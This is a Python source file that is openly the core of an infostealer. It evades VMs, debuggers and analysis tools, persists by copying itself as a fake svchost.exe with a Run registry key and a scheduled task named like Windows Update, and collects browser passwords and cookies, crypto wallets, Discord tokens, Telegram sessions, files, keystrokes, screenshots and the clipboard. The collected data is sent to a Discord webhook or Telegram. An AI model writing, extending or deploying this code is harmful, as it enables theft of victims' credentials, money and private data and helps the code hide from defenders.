import os
import sys
import json
import time
import ctypes
import base64
import random
import string
import shutil
import tempfile
import subprocess
import urllib.request
from datetime import datetime


def load_config():
    try:
        with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "config.json"), "r") as f:
            return json.load(f)
    except:
        return {
            "webhook": "https://discord.com/api/webhooks/REPLACE_WITH_WEBHOOK",
            "telegram_token": "",
            "telegram_chat_id": "",
            "encryption_key": "".join(random.choices(string.ascii_letters + string.digits, k=32)),
            "exfil_mode": "discord",
            "sleep_time": 5,
            "jitter": 3,
            "max_retries": 5,
            "anti_vm": True,
            "anti_debug": True,
            "anti_analysis": True,
            "steal_cookies": True,
            "steal_passwords": True,
            "steal_wallets": True,
            "steal_discord": True,
            "steal_telegram": True,
            "file_grabber": True,
            "keylogger": True,
            "screenshot": True,
            "clipboard": True,
            "webcam": False,
            "persistence": True,
            "file_extensions": [".txt", ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".png", ".jpg", ".wallet", ".dat"],
            "max_file_size": 5242880,
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        }

CONFIG = load_config()


def check_debugger():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
        if ctypes.windll.ntdll.NtQueryInformationProcess(ctypes.c_void_p(-1), 7, None, 0, None) == 0:
            return True
    except:
        pass
    return False


def check_vm():
    vm_indicators = [
        "vbox", "vmware", "qemu", "virtual", "hyper-v", "parallels"
    ]
    try:
        system_info = subprocess.check_output("systeminfo", shell=True, stderr=subprocess.DEVNULL).decode().lower()
        for indicator in vm_indicators:
            if indicator in system_info:
                return True
    except:
        pass
    
    try:
        import wmi
        c = wmi.WMI()
        for disk in c.Win32_DiskDrive():
            for indicator in vm_indicators:
                if indicator in str(disk.Model).lower():
                    return True
    except:
        pass
    
    
    try:
        mac = uuid.getnode()
        mac_str = ':'.join(['{:02x}'.format((mac >> elements) & 0xff) for elements in range(0,8*6,8)][::-1])
        vm_mac_prefixes = ["00:0c:29", "00:1c:14", "00:50:56", "00:05:69", "08:00:27"]
        for prefix in vm_mac_prefixes:
            if mac_str.startswith(prefix):
                return True
    except:
        pass
    
    return False


def check_analysis_tools():
    analysis_tools = [
        "wireshark.exe", "procmon.exe", "processhacker.exe", "processexplorer.exe",
        "tcpview.exe", "autoruns.exe", "fiddler.exe", "regmon.exe", "filemon.exe",
        "ollydbg.exe", "x64dbg.exe", "x32dbg.exe", "immunitydebugger.exe", "windbg.exe"
    ]
    try:
        output = subprocess.check_output("tasklist", shell=True, stderr=subprocess.DEVNULL).decode().lower()
        for tool in analysis_tools:
            if tool in output:
                return True
    except:
        pass
    return False

# Persistence
def establish_persistence():
    try:
        
        appdata = os.getenv("APPDATA")
        target_dir = os.path.join(appdata, "Microsoft", "Windows", "Update")
        os.makedirs(target_dir, exist_ok=True)
        target_path = os.path.join(target_dir, "svchost.exe")
        
        if not os.path.exists(target_path):
            shutil.copy2(sys.executable, target_path)
        
        
        import winreg
        key = winreg.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = winreg.OpenKey(key, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, target_path)
        winreg.CloseKey(reg_key)
        
        
        task_cmd = f'schtasks /create /tn "WindowsUpdateTask" /tr "{target_path}" /sc hourly /mo 2 /f'
        subprocess.Popen(task_cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        
        return True
    except:
        return False


def get_system_info():
    import platform
    info = {
        "timestamp": datetime.now().isoformat(),
        "os": platform.system(),
        "os_version": platform.version(),
        "os_release": platform.release(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "hostname": os.getenv("COMPUTERNAME"),
        "username": os.getenv("USERNAME"),
        "appdata": os.getenv("APPDATA"),
        "localappdata": os.getenv("LOCALAPPDATA"),
        "public_ip": ""
    }
    try:
        info["public_ip"] = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
    except:
        try:
            info["public_ip"] = urllib.request.urlopen("http://ifconfig.me/ip", timeout=5).read().decode().strip()
        except:
            info["public_ip"] = "Unknown"
    return info


def main():
    try:
        
        sleep_time = CONFIG.get("sleep_time", 5) + random.uniform(0, CONFIG.get("jitter", 3))
        time.sleep(sleep_time)
        
        
        if CONFIG.get("anti_vm", True) and check_vm():
            return
        if CONFIG.get("anti_debug", True) and check_debugger():
            return
        if CONFIG.get("anti_analysis", True) and check_analysis_tools():
            return
        
        
        if CONFIG.get("persistence", True):
            establish_persistence()
        
        
        sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
        
        from modules import system_info, browser_stealer, discord_token, telegram
        from modules import wallets, file_grabber, keylogger, screenshot, clipboard
        from network import exfil, encryption
        
        
        collected_data = {
            "system": get_system_info(),
            "timestamp": datetime.now().isoformat()
        }
        
        
        if CONFIG.get("steal_cookies", True) or CONFIG.get("steal_passwords", True):
            browser_data = browser_stealer.steal_all()
            if CONFIG.get("steal_cookies", True):
                collected_data["cookies"] = browser_data.get("cookies", [])
            if CONFIG.get("steal_passwords", True):
                collected_data["passwords"] = browser_data.get("passwords", [])
        
        
        if CONFIG.get("steal_wallets", True):
            collected_data["wallets"] = wallets.steal_wallets()
        
        
        if CONFIG.get("steal_discord", True):
            collected_data["discord_tokens"] = discord_token.grab_tokens()
        
        
        if CONFIG.get("steal_telegram", True):
            collected_data["telegram"] = telegram.grab_sessions()
        
        
        if CONFIG.get("file_grabber", True):
            extensions = CONFIG.get("file_extensions", [".txt", ".pdf"])
            max_size = CONFIG.get("max_file_size", 5242880)
            collected_data["files"] = file_grabber.grab_files(extensions, max_size)
        
        
        if CONFIG.get("keylogger", True):
            keylogger.start()
            collected_data["keylogs"] = keylogger.get_logs()
        
        
        if CONFIG.get("screenshot", True):
            collected_data["screenshot"] = screenshot.capture()
        
        
        if CONFIG.get("clipboard", True):
            collected_data["clipboard"] = clipboard.capture()
        
        
        exfil.send_data(collected_data, CONFIG)
        
    except Exception as e:
        # Silent fail
        pass

if __name__ == "__main__":
    main()